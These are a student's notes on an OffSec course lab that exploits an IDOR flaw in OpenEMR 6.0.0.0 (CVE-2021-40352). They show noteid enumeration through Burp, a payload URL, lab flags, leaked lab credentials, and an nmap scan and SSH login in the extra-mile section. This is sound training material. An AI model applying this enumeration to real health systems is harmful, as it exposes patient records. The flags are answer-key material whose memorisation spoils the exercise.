
This Learning Unit covers the following Learning Objectives:

1. Learn how to approach IDOR from a Black Box perspective
2. Understand how to discover the vulnerability
3. Develop our knowledge of OpenEMR IDOR exploitation

In this Learning Unit, we will focus on the discovery and exploitation of an IDOR vulnerability in an open source medical platform known as OpenEMR, version 6.0.0.0 (CVE-2021-40352).[1](https://portal.offsec.com/courses/web-200-28380/learning/insecure-direct-object-referencing-36181/case-study-openemr-36212/case-study-openemr-36222#fn-local_id_570-1)Â We'll begin by performing a manual assessment of the web application in the coming sections.

Before we can begin the assessment, let's work on getting access to the machine itself.

--------

#### 13.3.1. Accessing The OpenEMR Case Study

We can access the OpenEMR application via anÂ /etc/hostsÂ file entry on our Kali Linux VM.

```bash
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.105  openemr
```

We'll start the machine by clicking theÂ _Start_Â button below. This will provide an IP address we can use to update our host files.

_Note:_Â This machine is a very large medical platform and may take a few minutes to load completely.

--------------------

#### 13.3.2. Discovery of the IDOR Vulnerability

We'll begin our discovery phase by browsing the web application and assessing any potential parameters or functionality that stand out based upon what we have learned in this Learning Module. Let's first ensure Burp Suite is started and that theÂ _Intercept_Â button is turned off for now.

We'll start discovery by launching our web browser and pointing it toÂ `http://openemr:80/`.

![[Pasted image 20241105180840.png]]

We will log in as a low-privileged user called `lowpriv` using the password `Password1!`.

![[Pasted image 20241105180955.png]]

After a few moments, we will be presented with the dashboard interface for OpenEMR.

![[Pasted image 20241105181007.png]]
Our user's name is shown in the upper-right corner of the page, indicating we've successfully logged in as the low-privileged user Nancy Jones.

Whenever we explore new web applications, we should take the time to manually peruse the app to better understand how it functions and how we might discover vulnerabilities.

Because this is such a large medical platform, there are many different buttons, tabs, pages, and forms we can inspect.

To start, we'll notice directly on the landing page that we are presented with two separate tabs:Â _Calendar_Â andÂ _Message Center_.

![[Pasted image 20241105181116.png]]
After clickingÂ _Message Center_, we will be shown a table with one entry. It seems that confidential information pertaining to patients or staff will appear here. The table consists of a few buttons we can click on, includingÂ _Messages_,Â _Reminders_, andÂ _Recalls_. We can also add a message as our current user. For now, let's inspect the message sent from Nancy Jones to Stan Chyna.

It's important to note that we must allow each and every request sent from this application to resolve in full. The application has the potential to "hang" while processing background information. Once we have confirmed our previous request to the Message Center is complete, we'll continue and click onÂ _Chyna, Stan_.

![[Pasted image 20241105182310.png]]

We will be presented with the following Messages, Reminders, and Recalls page that displays the message we're interested in. This page allows us to reply and offers other options.

![[Pasted image 20241105182607.png]]

We might be able to view the complete message by using theÂ _Print Message_Â option. Before attempting this, let's return to Burp Suite and turn onÂ _Intercept_.

![[Pasted image 20241105182738.png]]

With the Intercept functionality enabled, we can return to the patient messages and clickÂ _Print Message_.

![[Pasted image 20241105182748.png]]
This will generate a request that is immediately captured by Burp. Inside the body of our captured request, we will right-click and selectÂ _Send to Repeater_.
![[Pasted image 20241105182800.png]]

Once we have sent the request to the Repeater for further analysis, we'll clickÂ _Send_, which presents us with the following.

![[Pasted image 20241105183159.png]]

As demonstrated, we have sent the request and we can now more closely observe both the requested URI and the response containing the full message.

It certainly seems that theÂ _noteid_Â parameter with the value "11" sent in the request is very similar to the parameters we encountered in our IDOR Sandbox. Based on the knowledge we've gathered, we can guess an IDOR vulnerability may be lurking here.

With our discovery phase complete, we can begin exfiltrating data in the next section.


#### 13.3.3. Exploiting the IDOR Vulnerability

When exploiting this vulnerability, our primary goal is to exfiltrate the maximum amount of data possible.

Now that we have discovered a vulnerable endpoint potentially susceptible to a form of IDOR, let's test our suspicions about usingÂ _noteid_Â for further data exfiltration.

We can reasonably determine we've encountered an ID-Based IDOR finding.

We'll disable Burp Suite'sÂ _Intercept_Â feature from this point forward.

Let's take the request from the previous section (located in our Repeater) and, for legibility purposes, load the endpoint into our browser to observe the output.

![[Pasted image 20241105183719.png]]

We've received the complete output from a message sent by a Help Desk staff member including sensitive information about upcoming new patients.

This information does not appear to be immediately helpful with further system compromise. However, if we were to iterate and decrement the value ofÂ _noteid_, we might stumble across more valuable information.

![[Pasted image 20241105190508.png]]

In this instance, we were a bit luckier. If we were to penetrate the security mechanisms of this system, we would essentially have the IP addresses of neighboring machines on a private IP range, potentially enabling us to move laterally on the network.

We could continue this process of incrementing and decrementing the vulnerable endpoint to potentially retrieve even more valuable information for target compromise.

Before wrapping up, let's take a moment to closely review our finding. We'll recall that we're acting as a low-privileged user named Nancy Jones. Let's suppose we were a patient with access to this platform. This demonstrates an extremely severe vulnerability. By compromising medical data, we've observed a critically-sensitive information leak between a doctor and their patients.

_Note:_Â This machine is a very large medical platform and may take a few minutes to load completely.



##### Labs
1. `OS{ToSeeAWorldInAGrainOfSand}`
![[Pasted image 20241105193708.png]]

payload
```bash
http://openemr/interface/patient_file/summary/pnotes_print.php?noteid=12
```


![[Pasted image 20241105193637.png]]


---------

#### Extra Mile:

1. `OS{idor_flag_of_sweetness}`
![[Pasted image 20241105193754.png]]
```bash
Unassigned for

Assigned To: admin

Active: Yes

2021-11-27 03:44 (admin to admin) Dear Siren,

This does not directly concern your recent visit into the doctor's office. We just wanted to thank you for helping set up the servers and getting everything working.

There does seem to be an issue with your account though - I was going to place your medical records on the admin machine you set up for us, but I could just not get it to work.

Please, try these credentials and see if they work for you:
Username: siren
Password: healthmatters!

I wrote down the IP thingy or whatever you gave me on a sticky note:
openemr_adminbox-instance_1

I think that's it...

Give me a call if you're able to fix whatever is slowing down the server.

I hope we're not getting DDOSd like you told me could happen. Is there any way to prevent that? Anyways, best of luck with the new course and we hope to see you again soon and with better LDL numbers!

Your Friend and Doctor,
~Doctor Phaber.
```
![[Pasted image 20241105192250.png]]

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Nov2024 00:30:49]-[/home/kali]
â””â”€# nmap -Pn -sV openemr -p 2222    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 00:31 UTC
Nmap scan report for openemr (192.168.154.105)
Host is up (0.067s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
                                                                                                                                                                                                           
â”Œâ”€â”€(rootðŸ’€gobots)-[06Nov2024 00:31:14]-[/home/kali]
â””â”€# ssh -p 2222 siren@192.168.154.105

siren@192.168.154.105's password: 
Linux 28b3cff50e31 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Could not chdir to home directory /home/siren: No such file or directory
$ ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
$ cd /var/tmp
$ ls
flag.txt
$ cat flag.txt
OS{idor_flag_of_sweetness}

```

![[Pasted image 20241105193232.png]]